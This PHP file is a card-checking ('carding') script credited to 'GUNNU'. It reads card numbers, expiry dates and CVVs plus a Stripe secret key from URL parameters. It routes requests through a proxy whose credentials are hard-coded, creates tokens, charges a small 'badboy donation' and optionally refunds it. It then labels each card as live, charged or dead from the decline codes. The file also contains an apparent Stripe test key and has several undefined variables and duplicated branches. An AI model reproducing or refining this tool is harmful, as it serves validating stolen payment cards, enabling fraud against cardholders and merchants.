<?php



error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };

$idd = $_GET['idd'];
$amt = $_GET['cst'];
if(empty($amt)) {
	$amt = '1';
	$chr = $amt * 100;
}
$sk = $_GET['sec'];
$lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";
$curl = curl_init('http://pa-chicooked-US.ntnt.network/'); curl_setopt($curl, CURLOPT_PROXY, 'http://p.webshare.io:80'); 
curl_setopt($curl, CURLOPT_PROXYUSERPWD, '1Fqff0Em-cc-ccus-SID-76929742:pas0Zw8G'); curl_exec($curl);
ob_flush(); 
if (isset($ip1)){
    $ip = "🟢";
}
if (empty($ip1)){
    $ip = "✅";
}
echo '[ IP: '.$ip.' ] ';
////sk_test_9IMkiM6Ykxr1LCe2dJ3PgaxS



//================= [ CURL REQUESTS ] =================//

#-------------------[1st REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$first.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_line1]=Street '.rand(111, 999).'&card[address_line2]=Apartment&card[address_city]=Highlands&card[address_state]=Texas&card[address_zip]=77562&card[address_country]=us');


curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Authorization: Bearer '.$sk.'',
));

$r1 = curl_exec($ch);
$tok = trim(strip_tags(getstr($r1,'"id": "', '"')));
$d_code1 = trim(strip_tags(getStr($r1,'"decline_code": "', '"')));

    

# ---------- 2nd Req

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'source='.$tok.'&description=badboy donation&amount=50&currency=usd');

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Authorization: Bearer '.$sk.'',
));

$r2 = curl_exec($ch);
$charge = trim(strip_tags(getstr($r2,'"id": "','"')));
$receipt = trim(strip_tags(getStr($r2,'"receipt_url": "','"')));

if ((!empty($charge)) AND ($type == 'refund') OR (!empty($charge)) AND ($type == 'ccnrefund')){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/refunds');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'charge='.$charge.'&reason=requested_by_customer');

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Authorization: Bearer '.$sk.'',
'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''));


$r3 = curl_exec($ch);
}
#########################[Responses]############################
if(strpos($r2, '"seller_message": "Payment complete."' )) {
    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' CVV CHARGE+REFUND ✅ <br> ➤ <br>➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
}

elseif(strpos($r2,'"cvc_check": "pass"')){
    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
}


elseif(strpos($r1, "generic_decline")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINED</span><br>';
    }
elseif(strpos($r2, "generic_decline" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINED</span><br>';
}
elseif(strpos($r2, "insufficient_funds" )) {
    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS</span><br>';
}

elseif(strpos($r2, "fraudulent" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
}
elseif(strpos($resul3, "do_not_honor" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
    }
elseif(strpos($resul2, "do_not_honor" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
}
elseif(strpos($result,"fraudulent")){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';

}

elseif(strpos($r2,'"code": "incorrect_cvc"')){
    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
}
elseif(strpos($r1,' "code": "invalid_cvc"')){
    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
     
}
elseif(strpos($r1,"invalid_expiry_month")){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVAILD EXPIRY MONTH</span><br>';

}
elseif(strpos($r2,"invalid_account")){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVAILD ACCOUNT</span><br>';

}

elseif(strpos($r2, "do_not_honor")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
}
elseif(strpos($r2, "lost_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span><br>';
}
elseif(strpos($r2, "lost_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span></span>  <br>Result: CHECKER BY GUNNU</span> <br>';
}

elseif(strpos($r2, "stolen_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: STOLEN CARD</span><br>';
    }

elseif(strpos($r2, "stolen_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: STOLEN CARD</span><br>';


}
elseif(strpos($r2, "transaction_not_allowed" )) {
    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: TRANSACTION NOT ALLOWED</span><br>';
    }
    elseif(strpos($r2, "authentication_required")) {
    	echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
   } 
   elseif(strpos($r2, "card_error_authentication_required")) {
    	echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
   } 
   elseif(strpos($r2, "card_error_authentication_required")) {
    	echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
   } 
   elseif(strpos($r1, "card_error_authentication_required")) {
    	echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
   } 
elseif(strpos($r2, "incorrect_cvc" )) {
    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
}
elseif(strpos($r2, "pickup_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PICKUP CARD</span><br>';
}
elseif(strpos($r2, "pickup_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PICKUP CARD</span><br>';

}
elseif(strpos($r2, 'Your card has expired.')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: EXPIRED CARD</span><br>';
}
elseif(strpos($r2, 'Your card has expired.')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: EXPIRED CARD</span><br>';

}
elseif(strpos($r2, "card_decline_rate_limit_exceeded")) {
	echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK IS AT RATE LIMIT</span><br>';
}
elseif(strpos($r2, '"code": "processing_error"')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PROCESSING ERROR</span><br>';
    }
elseif(strpos($r2, ' "message": "Your card number is incorrect."')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT</span><br>';
    }
elseif(strpos($r2, '"decline_code": "service_not_allowed"')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SERVICE NOT ALLOWED</span><br>';
    }
elseif(strpos($r2, '"code": "processing_error"')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PROCESSING ERROR</span><br>';
    }
elseif(strpos($r2, ' "message": "Your card number is incorrect."')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT</span><br>';
    }
elseif(strpos($r2, '"decline_code": "service_not_allowed"')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SERVICE NOT ALLOWED</span><br>';

}
elseif(strpos($result, "incorrect_number")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER</span><br>';
}
elseif(strpos($r1, "incorrect_number")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER</span><br>';


}elseif(strpos($r1, "do_not_honor")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';

}
elseif(strpos($r1, 'Your card was declined.')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED</span><br>';

}
elseif(strpos($r1, "do_not_honor")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
    }
elseif(strpos($r2, "generic_decline")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC CARD</span><br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED</span><br>';

}
elseif(strpos($r2,' "decline_code": "do_not_honor"')){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
}
elseif(strpos($r2,'"cvc_check": "unchecked"')){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_UNCHECKED : INFORM AT OWNER</span><br>';
}
elseif(strpos($r2,'"cvc_check": "fail"')){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECK : FAIL</span><br>';
}
elseif(strpos($r2, "card_not_supported")) {
	echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
}
elseif(strpos($r2,'"cvc_check": "unavailable"')){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECK : UNVAILABLE</span><br>';
}
elseif(strpos($r2,'"cvc_check": "unchecked"')){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_UNCHECKED : INFORM TO OWNER」</span><br>';
}
elseif(strpos($r2,'"cvc_check": "fail"')){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECKED : FAIL</span><br>';
}
elseif(strpos($r2,"currency_not_supported")) {
	echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CURRENCY NOT SUPORTED TRY IN INR</span><br>';
}

elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo 'DEAD</span> CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORT THIS TYPE OF PURCHASE</span><br>';
    }

elseif(strpos($r2,'"cvc_check": "pass"')){
    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
}
elseif(strpos($r2, "fraudulent" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
}
elseif(strpos($r1, "testmode_charges_only" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK KEY DEAD OR INVALID</span><br>';
}
elseif(strpos($r1, "api_key_expired" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK KEY REVOKED</span><br>';
}
elseif(strpos($r1, "parameter_invalid_empty" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: ENTER CC TO CHECK</span><br>';
}
elseif(strpos($r1, "card_not_supported" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
}
else {
    echo 'DEAD</span> CC:  '.$lista.'</span>  <br>Result: INCREASE AMOUNT OR TRY ANOTHER CARD</span><br>';
   
   
      
}

//===================== [ MADE BY GUNNU ] ====================//


//echo "<br><b>Lista:</b> $lista<br>";
//echo "<br><b>CVV Check:</b> $cvccheck<br>";
//echo "<b>D_Code:</b> $dcode<br>";
//echo "<b>Reason:</b> $reason<br>";
//echo "<b>Risk Level:</b> $riskl<br>";
//echo "<b>Seller Message:</b> $seller_msg<br>";

//echo "<br><b>Result1: </b> $r1<br>";
//echo "<br><b>Result2: </b> $r2<br>";
//echo "<br><b>Result3: </b> $r3<br>";

curl_close($ch);
ob_flush();
?>
